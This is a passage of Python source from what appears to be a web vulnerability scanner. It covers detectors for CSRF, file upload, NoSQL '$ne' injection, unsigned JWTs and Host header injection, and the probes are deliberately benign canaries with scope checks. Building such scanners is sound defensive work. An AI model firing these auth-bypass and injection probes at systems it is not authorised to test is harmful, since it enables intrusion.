        if base is None or base.error or base.status in (401, 403) or not base.status:
            return None                          # auth-gated: no honest anonymous oracle
        hostile = self.engine.send(RequestMutation(endpoint=ep, note="csrf-probe",
                                                   extra_headers={"Origin": self.PROBE_ORIGIN,
                                                                  "Referer": self.PROBE_ORIGIN + "/x"}))
        if hostile is None or hostile.error or not hostile.status:
            return None
        similar = (hostile.status == base.status
                   and abs(len(hostile.body or "") - len(base.body or ""))
                       <= max(150, 0.25 * max(len(base.body or "x"), 1)))
        if hostile.ok and similar:
            return Finding("csrf", Severity.MEDIUM, ep.url,
                           ", ".join(p.name for p in ep.parameters if p.kind != ParamKind.TOKEN and not p.flow_control) or "-",
                           ep.method,
                [Evidence("cross_origin_acceptance",
                          f"state-changing {ep.method} accepted from hostile origin "
                          f"({self.PROBE_ORIGIN}): baseline -> HTTP {base.status} "
                          f"({len(base.body or '')}B), cross-origin replay -> HTTP "
                          f"{hostile.status} ({len(hostile.body or '')}B) — no CSRF "
                          f"token in the form and no Origin/Referer validation",
                          hostile.request_id)],
                status=FindingStatus.CANDIDATE)
        return None


class UploadDetector(Detector):
    """DETECT-18 (OWSP-18, live-caught on DVWA 3.x /vulnerabilities/upload/):
    unrestricted file upload. Multipart forms carrying a <input type=file>
    were probed as urlencoded TEXT params — the file part never shipped, the
    whole upload surface was structurally dead while the battery burned 50+
    requests on a ghost. The detector builds a REAL multipart body with a
    BENIGN canary text file (sentinel-<canary>.txt); the oracle is ACCEPTANCE
    (the response echoes the uploaded filename) plus SERVABILITY (the path
    the app itself references is fetched back and must contain the canary
    content). Executable shapes (.php/.jsp/.exe) are deliberately NEVER
    shipped: the capability is proven, not exploited — the L3 safety-doctrine
    applied at detection time. VR-20 re-uploads with a FRESH canary."""
    name, vuln_type = "upload", "unrestricted_file_upload"
    severity = Severity.HIGH

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if (ep.method or "POST").upper() not in ("POST", "PUT"):
            return None
        fparams = [p for p in ep.parameters if getattr(p, "is_file", False)]
        if not fparams:
            return None
        f = self._probe(ep, fparams[0])
        if f is None:
            return None
        return f

    def _probe(self, ep: Endpoint, fparam, canary: str | None = None) -> Finding | None:
        import hashlib as _hb
        if canary is None:
            canary = "u" + _hb.sha1(f"{ep.url}|{fparam.name}".encode()).hexdigest()[:9]
        fname = f"sentinel-{canary}.txt"
        content = f"sentinel-upload-canary {canary}\n"
        fields = [(p.name, p.value or "") for p in ep.parameters
                  if p.name != fparam.name and not getattr(p, "is_file", False)]
        boundary = "----sentinel" + canary
        parts = []
        for n, v in fields:
            parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{n}\"\r\n\r\n{v}\r\n")
        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{fparam.name}\"; "
                     f"filename=\"{fname}\"\r\nContent-Type: text/plain\r\n\r\n{content}\r\n")
        parts.append(f"--{boundary}--\r\n")
        body = "".join(parts)
        r = self.engine.send(RequestMutation(endpoint=ep, note="upload-probe",
                                             body_override=body,
                                             extra_headers={"Content-Type":
                                                 f"multipart/form-data; boundary={boundary}"}))
        if r is None or r.error or not r.status or not r.ok:
            return None
        rb = r.body or ""
        if fname not in rb:
            return None                          # not echoed: acceptance unprovable
        ev = [Evidence("upload_accepted",
                       f"multipart upload of {fname} accepted (HTTP {r.status}, filename echoed in response)",
                       r.request_id)]
        # serve-check: the app's own reference to the stored file is fetched back
        # OWSP-18d (live-caught on DVWA 3.x): the app echoes the stored path in
        # more shapes than a quoted href — DVWA prints it as PLAIN TEXT
        # ('<pre>../../hackable/uploads/sentinel-*.txt succesfully uploaded!</pre>',
        # no quotes, no anchor). Quoted-context first, then a path-shaped
        # fallback (word/slash/dot run carrying the filename).
        m = (re.search(r"['\"]([^'\"]{0,300}" + re.escape(fname) + r")['\"]", rb)
             or re.search(r"([\w./\-]{0,300}" + re.escape(fname) + r")", rb))
        if m:
            import urllib.parse as _up
            # OWSP-18c: urljoin against a base ending in "//" (ep.url already
            # slash-terminated + the appended "/") makes every leading "../"
            # consume the empty segment first — the reference resolves one level
            # too shallow and the serve-check 404s. Base must carry exactly one
            # trailing slash.
            _base = ep.url if ep.url.endswith("/") else ep.url + "/"
            target = _up.urljoin(_base, m.group(1))
            ok_scope, _ = self.engine._scope_ok(target)
            if ok_scope:
                r2 = self.engine.send(RequestMutation(
                    endpoint=Endpoint(url=target, method="GET"), note="upload-serve-check"))
                if r2 is not None and not r2.error and r2.ok and canary in (r2.body or ""):
                    ev.append(Evidence("upload_served",
                                       f"uploaded file SERVED back at {target} — canary content intact "
                                       f"(HTTP {r2.status}, {len(r2.body or '')}B)", r2.request_id))
        return Finding(type="unrestricted_file_upload", severity=self.severity, endpoint_url=ep.url,
                       parameter=fparam.name, method=ep.method, evidence=ev,
                       status=FindingStatus.CANDIDATE)


class NosqlDetector(Detector):
    """DETECT-17 (NoSQL operator injection, auth-bypass class): JSON-body
    endpoints where a $operator object replaces a literal value and flips a
    rejection into an acceptance — the Mongo '\\$ne / \\$gt' bypass shape. The
    baseline (literal wrong credentials) must be REJECTED first; only then can
    an operator-induced acceptance be a bypass. VR-14 re-tests with a DIFFERENT
    operator (\\$gt after \\$ne)."""
    name, vuln_type = "nosql", "nosql_injection"
    severity = Severity.CRITICAL
    MAX_ENDPOINTS = 8                 # deterministic budget

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._done = 0

    @staticmethod
    def _json_body(ep: Endpoint, carrier: str, value) -> str:
        import json as _json
        obj = {}
        for p in ep.parameters:
            obj[p.name] = (value if p.name == carrier else (p.value or "sentinel"))
        return _json.dumps(obj)

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if (ep.method or "GET").upper() not in ("POST", "PUT"):
            return None
        if not any(str(p.location) == "json" or getattr(p.location, "value", "") == "json"
                   or p.location == "json" for p in ep.parameters):
            return None                          # JSON-body endpoints only
        if self._done >= self.MAX_ENDPOINTS:
            return None
        self._done += 1
        carrier = next((p for p in ep.parameters if p.kind != ParamKind.TOKEN and not p.flow_control), None)
        if carrier is None:
            return None
        import json as _json
        base = self.engine.send(RequestMutation(endpoint=ep, note="nosql-baseline",
                                                body_override=self._json_body(ep, carrier.name, "sentinel-wrong")))
        if base is None or base.error or base.ok:
            return None                          # baseline must be a REJECTION (401/403/4xx)
        probe = self.engine.send(RequestMutation(endpoint=ep, note="nosql-ne",
                                                 body_override=self._json_body(ep, carrier.name, {"$ne": "x"})))
        if probe is None or probe.error or not probe.ok:
            return None
        return Finding("nosql_injection", Severity.CRITICAL, ep.url, carrier.name, ep.method,
            [Evidence("operator_bypass",
                      f"NoSQL operator bypass: literal value -> HTTP {base.status} "
                      f"(rejected), {{\"$ne\"}} operator value -> HTTP {probe.status} "
                      f"(accepted) — the query treats attacker JSON objects as match "
                      f"operators, not literals. param={carrier.name}", probe.request_id)],
            status=FindingStatus.CANDIDATE)


class JwtDetector(Detector):
    """DETECT-18 (JWT analysis, auth-integrity class): auth-shaped endpoints are
    replayed benignly and their responses (body + Set-Cookie) mined for JWTs.
    An issued token with alg=none and an empty signature is a defect by
    RFC 8725 §3.1 (any party can forge claims if the verifier honors none) —
    reported with the decoded header/claims as primary evidence. Signed algs
    (HS256/RS256...) are NORMAL issuance and stay silent; missing exp is noted
    in the evidence detail. VR-15 = fresh benign replay must issue another
    none-alg token."""
    name, vuln_type = "jwt", "jwt_security"
    severity = Severity.MEDIUM
    AUTHISH = ("login", "signin", "sign-in", "auth", "token", "jwt", "session",
               "apikey", "api-key", "credential", "oauth")
    TOKEN_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{4,}\.([A-Za-z0-9_-]*)")
    MAX_ENDPOINTS = 6                  # deterministic budget

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._done = 0

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    @staticmethod
    def _decode(seg: str) -> dict:
        import base64 as _b64, json as _json
        pad = "=" * (-len(seg) % 4)
        try:
            return _json.loads(_b64.urlsafe_b64decode(seg + pad).decode("utf-8", "replace"))
        except Exception:
            return {}

    def run(self, ep: Endpoint) -> Finding | None:
        blob = ep.url.lower()
        if not any(w in blob for w in self.AUTHISH):
            return None
        if self._done >= self.MAX_ENDPOINTS:
            return None
        self._done += 1
        r = self.engine.send(RequestMutation(endpoint=ep, note="jwt-capture"))
        if r is None or r.error or not r.status:
            return None
        hay = (r.body or "") + " ".join(f"{k}={v}" for k, v in (r.headers or {}).items()
                                        if k.lower() == "set-cookie")
        m = self.TOKEN_RE.search(hay)
        if not m:
            return None
        header = self._decode(m.group(0).split(".")[0])
        alg = str(header.get("alg", "")).lower()
        sig = m.group(1)
        if alg != "none" or sig:
            return None                          # signed issuance is normal
        claims = self._decode(m.group(0).split(".")[1])
        notes = ", ".join(sorted(claims.keys())) or "no claims"
        exp_note = "" if "exp" in claims else "; missing exp claim (no expiry)"
        return Finding("jwt_security", Severity.MEDIUM, ep.url, "-", ep.method,
            [Evidence("unsigned_jwt_issued",
                      f"server issues UNSIGNED JWT (alg=none, empty signature) — "
                      f"RFC 8725 §3.1: if the verifier honors none, any party can "
                      f"forge arbitrary claims. claims: {notes}{exp_note}", r.request_id)],
            status=FindingStatus.CANDIDATE)


class HostHeaderDetector(Detector):
    """DETECT-19 (Host header injection): a canary Host is sent on GET HTML
    endpoints; if the app reflects it into the response (absolute links built
    from Host — the password-reset-poisoning / cache-poisoning class), the
    canary appears and the finding stands. Fixed-base apps never reflect —
    silent. VR-16 re-tests with a FRESH canary host."""
    name, vuln_type = "hostheader", "host_header_injection"
    severity = Severity.MEDIUM
    # Budget recalibrated for the fixture-v8 surface (Phase 56): the authenticated
    # landing now contributes 4 API endpoints that sort BEFORE the classic pages,
    # pushing /vuln/hostbuild past the old 10-endpoint cap — live-caught by the
    # benchmark going FN on host_header_injection the moment the surface grew.
    MAX_ENDPOINTS = 16
    SKIP_EXT = (".css", ".js", ".png", ".jpg", ".jpeg", ".svg", ".gif", ".ico", ".woff", ".woff2", ".map")

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._done = 0

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def _canary(self, ep: Endpoint) -> str:
        import hashlib as _hb
        return f"sentinel-hh-{_hb.sha1(ep.url.encode()).hexdigest()[:10]}.example"

    def run(self, ep: Endpoint) -> Finding | None:
        if (ep.method or "GET").upper() != "GET":
            return None
        if ep.url.split("?")[0].lower().endswith(self.SKIP_EXT):
            return None
        if self._done >= self.MAX_ENDPOINTS:
            return None
        self._done += 1
        canary = self._canary(ep)
        r = self.engine.send(RequestMutation(endpoint=ep, note="hostheader-probe",
                                             extra_headers={"Host": canary}))
        if r is None or r.error or not r.status:
            return None
        where = []
        if canary in (r.body or ""):
            where.append("response body")
        for hk, hv in (r.headers or {}).items():
            if canary in str(hv):
                where.append(f"{hk} header")
        if not where:
            return None
        return Finding("host_header_injection", Severity.MEDIUM, ep.url, "Host", "GET",
            [Evidence("host_reflection",
                      f"canary Host reflected in {', '.join(where)}: the application "
                      f"builds output from the attacker-controlled Host header "
                      f"(link-manipulation / reset-poisoning class). canary={canary}",
                      r.request_id)],
            status=FindingStatus.CANDIDATE)



SECURITY_HEADERS = ["strict-transport-security", "content-security-policy", "x-frame-options",
                    "x-content-type-options", "referrer-policy"]

def passive_audit(ep: Endpoint, resp) -> list[Finding]:
    out = []
    if resp is None or not resp.status: return out
    missing = [h for h in SECURITY_HEADERS if h not in resp.headers]
    if missing:
        out.append(Finding("missing_security_headers", Severity.LOW, ep.url, "", ep.method,
                    [Evidence("header_absent", f"missing: {', '.join(missing)}", resp.request_id)],
                    status=FindingStatus.CANDIDATE))
    srv = resp.headers.get("server", "")
    if srv and re.search(r"[0-9]+\.[0-9]+", srv):
        out.append(Finding("server_banner_disclosure", Severity.LOW, ep.url, "", ep.method,
                    [Evidence("header_value", f"Server: {srv}", resp.request_id)],
                    status=FindingStatus.CANDIDATE))
    powered = resp.headers.get("x-powered-by", "")
    if powered:
        out.append(Finding("tech_banner_disclosure", Severity.LOW, ep.url, "", ep.method,
                    [Evidence("header_value", f"X-Powered-By: {powered}", resp.request_id)],
                    status=FindingStatus.CANDIDATE))
    # PASSIVE-02 (live-caught on ginandjuice.shop): vulnerable JS dependency detection —
    # PortSwigger's scanme serves angular_1-7-7.js and lists "Vulnerable JavaScript
    # dependency" in its own ground truth. Version-sniff the asset path.
    base = ep.url.rsplit("/", 1)[-1].lower()
    for pat, msg in VULN_JS_DEPS:
        if pat.search(base):
            out.append(Finding("vulnerable_js_dependency", Severity.LOW, ep.url, "", ep.method,
                        [Evidence("banner", f"served asset {base!r}: {msg}", resp.request_id)],
                        status=FindingStatus.CANDIDATE))
            break
    return out


# Known-vulnerable JS assets (extend as advisories accumulate; keep deterministic).
VULN_JS_DEPS = [
    (re.compile(r"angular[^/?]*[_.\-]?1[_.\-]?[0-9]"),
     "AngularJS 1.x — end-of-life branch (Jan 2022); sandbox-escape / client-side template injection class (CVE-2019-10768, CVE-2024-21490)"),
]


ACTIVE_DETECTORS = [SQLiDetector, XSSDetector, TraversalDetector, RedirectDetector, CrlfDetector,
                    XxeDetector, SsrfDetector, CommandInjectionDetector, CorsDetector,
                    SstiDetector, CsrfDetector, NosqlDetector, JwtDetector, HostHeaderDetector,
                    StoredXSSDetector, PathTraversalDetector, UploadDetector]

# Detectors that drive their own multi-request flows per ENDPOINT (no param-bound
# generic loop) — the orchestrator calls det.run(ep) directly, like CORS.
RUN_STYLE_DETECTORS = {"cors", "ssti", "csrf", "nosql", "jwt", "hostheader", "upload"}
